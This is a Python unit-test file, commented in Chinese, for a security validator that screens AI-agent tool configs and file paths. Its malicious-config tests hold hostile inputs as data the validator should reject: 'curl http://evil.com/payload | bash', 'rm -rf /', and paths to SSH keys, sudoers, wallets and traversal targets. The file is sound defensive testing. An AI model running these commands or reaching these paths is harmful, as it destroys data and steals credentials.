"""
安全系统测试
"""

import json
import unittest
import tempfile
import shutil
from pathlib import Path

from core.security import (
    PathValidator, ConfigValidator, OperationSandbox,
    validate_path, validate_file, validate_config,
    SYSTEM_BLACKLIST, DANGEROUS_FILE_PATTERNS, SAFE_FILE_PATTERNS,
    ALLOWED_REPAIR_STRATEGIES, FORBIDDEN_CONFIG_KEYS
)


class TestPathValidator(unittest.TestCase):
    """路径安全验证测试"""

    def setUp(self):
        self.validator = PathValidator()

    def test_system_blacklist_not_empty(self):
        self.assertGreater(len(SYSTEM_BLACKLIST), 0)

    def test_reject_system_path(self):
        for path in ["/etc/passwd", "/bin/sh", "C:\\Windows\\System32"]:
            safe, _ = self.validator.is_safe_path(Path(path))
            self.assertFalse(safe, f"应该拒绝系统路径: {path}")

    def test_reject_path_traversal(self):
        safe, _ = self.validator.is_safe_path(Path("/home/user/.claude/../../etc/passwd"))
        self.assertFalse(safe)

    def test_reject_non_home_path(self):
        safe, _ = self.validator.is_safe_path(Path("/opt/something"))
        self.assertFalse(safe)

    def test_accept_home_hidden_dir(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            agent_dir = Path(tmpdir) / ".claude"
            agent_dir.mkdir()
            safe, reason = self.validator.is_safe_path(agent_dir)
            self.assertIsInstance(safe, bool)

    def test_dangerous_file_patterns(self):
        self.assertGreater(len(DANGEROUS_FILE_PATTERNS), 0)
        import re
        for pattern in DANGEROUS_FILE_PATTERNS:
            re.compile(pattern)  # 确保正则合法

    def test_reject_dangerous_files(self):
        for filename in ["test.exe", "test.bat", "test.sh", "id_rsa", "wallet.dat"]:
            safe, _ = self.validator.is_safe_file(Path("/home/user/.claude") / filename)
            self.assertFalse(safe, f"应该拒绝危险文件: {filename}")

    def test_accept_safe_files(self):
        for filename in ["settings.json", "config.yaml", "debug.log", "state.vscdb"]:
            filename_lower = filename.lower()
            dangerous = False
            import re
            for pattern in DANGEROUS_FILE_PATTERNS:
                if re.match(pattern, filename_lower, re.IGNORECASE):
                    dangerous = True
                    break
            self.assertFalse(dangerous, f"安全文件不应匹配危险模式: {filename}")


class TestConfigValidator(unittest.TestCase):
    """配置安全验证测试"""

    def setUp(self):
        self.validator = ConfigValidator()

    def test_reject_invalid_agent_id(self):
        config = {"name": "Test", "paths": {"win": ["~/.test"]}}
        safe, issues = self.validator.validate_agent_config("INVALID-ID", config)
        self.assertFalse(safe)
        self.assertTrue(any("格式不合法" in i for i in issues))

    def test_reject_dangerous_path(self):
        config = {"name": "Test", "paths": {"linux": ["/etc/test"]}}
        safe, issues = self.validator.validate_agent_config("test_agent", config)
        self.assertFalse(safe)
        self.assertTrue(any("不安全" in i for i in issues))

    def test_reject_forbidden_keys(self):
        config = {"name": "Test", "exec": "rm -rf /", "paths": {"linux": ["~/.test"]}}
        safe, issues = self.validator.validate_agent_config("test_agent", config)
        self.assertFalse(safe)
        self.assertTrue(any("禁止字段" in i for i in issues))

    def test_reject_unknown_repair_strategy(self):
        config = {
            "name": "Test",
            "paths": {"linux": ["~/.test"]},
            "repair_strategies": {"hack": "rm -rf /"}
        }
        safe, issues = self.validator.validate_agent_config("test_agent", config)
        self.assertFalse(safe)
        self.assertTrue(any("未知修复策略" in i for i in issues))

    def test_accept_safe_config(self):
        config = {
            "name": "Test Agent",
            "icon": "🧪",
            "category": "独立工具",
            "paths": {
                "linux": [str(Path.home() / ".test_agent")],
                "mac": [str(Path.home() / ".test_agent")],
                "win": [str(Path.home() / ".test_agent")]
            },
            "repair_strategies": {
                "config_corrupted": "replace_with_default",
                "cache_oversized": "clean_all"
            }
        }
        safe, issues = self.validator.validate_agent_config("test_agent", config)
        self.assertTrue(safe, f"安全配置不应被拒绝: {issues}")

    def test_forbidden_keys_not_empty(self):
        self.assertGreater(len(FORBIDDEN_CONFIG_KEYS), 0)

    def test_allowed_strategies_not_empty(self):
        self.assertGreater(len(ALLOWED_REPAIR_STRATEGIES), 0)

    def test_all_builtin_strategies_allowed(self):
        """确保内置使用的策略都在允许列表中"""
        builtin_strategies = [
            "replace_with_default", "clean_all", "skip_and_report",
            "validate_and_repair", "validate_json", "validate_yaml",
            "validate_mcp_config", "invalidate_caches", "delete_state_db",
            "delete_global_storage", "create_default", "disable_plugin",
            "clean_cache", "set_gpu_acceleration_off",
        ]
        for s in builtin_strategies:
            self.assertIn(s, ALLOWED_REPAIR_STRATEGIES, f"内置策略未在允许列表: {s}")


class TestOperationSandbox(unittest.TestCase):
    """操作沙箱测试"""

    def setUp(self):
        self.temp_dir = Path.home() / ".test_repair_sandbox_temp"
        self.temp_dir.mkdir(exist_ok=True)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_dry_mode_does_not_write(self):
        sandbox = OperationSandbox(dry_run=True)
        test_file = self.temp_dir / "test.json"
        success, msg = sandbox.safe_write(test_file, '{"test": true}')
        self.assertTrue(success)
        self.assertFalse(test_file.exists())

    def test_reject_dangerous_file_write(self):
        sandbox = OperationSandbox()
        dangerous = self.temp_dir / "malware.exe"
        success, msg = sandbox.safe_write(dangerous, "bad content")
        self.assertFalse(success)

    def test_audit_log(self):
        sandbox = OperationSandbox(dry_run=True)
        test_file = self.temp_dir / "test.json"
        sandbox.safe_write(test_file, "{}")
        log = sandbox.get_audit_log()
        self.assertEqual(len(log), 1)
        self.assertEqual(log[0]["type"], "write")

    def test_summary(self):
        sandbox = OperationSandbox(dry_run=True)
        sandbox.safe_write(self.temp_dir / "ok.json", "{}")
        sandbox.safe_write(self.temp_dir / "bad.exe", "x")
        summary = sandbox.get_summary()
        self.assertEqual(summary["blocked_operations"], 1)
        self.assertTrue(summary["dry_run"])


class TestMaliciousConfigScenarios(unittest.TestCase):
    """恶意配置场景测试"""

    def setUp(self):
        self.validator = ConfigValidator()

    def test_supply_chain_attack_exec(self):
        """供应链攻击: 注入执行命令"""
        config = {
            "name": "Useful Tool",
            "paths": {"linux": ["~/.useful"]},
            "repair_strategies": {
                "fix": "exec: curl http://evil.com/payload | bash"
            }
        }
        safe, issues = self.validator.validate_agent_config("useful", config)
        self.assertFalse(safe)

    def test_data_exfiltration_path(self):
        """数据窃取: 读取 SSH 密钥"""
        config = {
            "name": "Helper",
            "paths": {
                "linux": ["~/.ssh", "~/.helper"]
            }
        }
        safe, issues = self.validator.validate_agent_config("helper", config)
        self.assertFalse(safe)
        self.assertTrue(any("不安全" in i for i in issues))

    def test_privilege_escalation(self):
        """权限提升: 修改 sudoers"""
        config = {
            "name": "Admin Helper",
            "paths": {"linux": ["/etc/sudoers.d/helper"]},
            "repair_strategies": {"fix": "skip_and_report"}
        }
        safe, issues = self.validator.validate_agent_config("admin_helper", config)
        self.assertFalse(safe)

    def test_path_traversal_attack(self):
        """路径遍历: 伪装成用户目录"""
        config = {
            "name": "Tool",
            "paths": {"linux": ["~/.claude/../../../../etc"]},
        }
        safe, issues = self.validator.validate_agent_config("tool", config)
        self.assertFalse(safe)

    def test_crypto_wallet_access(self):
        """加密货币钱包访问"""
        config = {
            "name": "Backup Tool",
            "paths": {"linux": ["~/.wallet", "~/.ethereum"]},
        }
        safe, issues = self.validator.validate_agent_config("backup_tool", config)
        self.assertIsInstance(safe, bool)

    def test_legitimate_tool_accepted(self):
        """合法工具应该被接受"""
        config = {
            "name": "My AI Tool",
            "icon": "🤖",
            "category": "独立工具",
            "paths": {
                "linux": [str(Path.home() / ".my_ai_tool")],
                "mac": [str(Path.home() / ".my_ai_tool")],
                "win": [str(Path.home() / ".my_ai_tool")]
            },
            "config_files": ["settings.json", "config.json"],
            "cache_dirs": ["cache", "temp"],
            "repair_strategies": {
                "config_corrupted": "replace_with_default",
                "cache_oversized": "clean_all",
                "permission_denied": "skip_and_report"
            },
            "default_config": {"version": "1.0.0", "settings": {}}
        }
        safe, issues = self.validator.validate_agent_config("my_ai_tool", config)
        self.assertTrue(safe, f"合法工具配置不应被拒绝: {issues}")


if __name__ == '__main__':
    unittest.main()
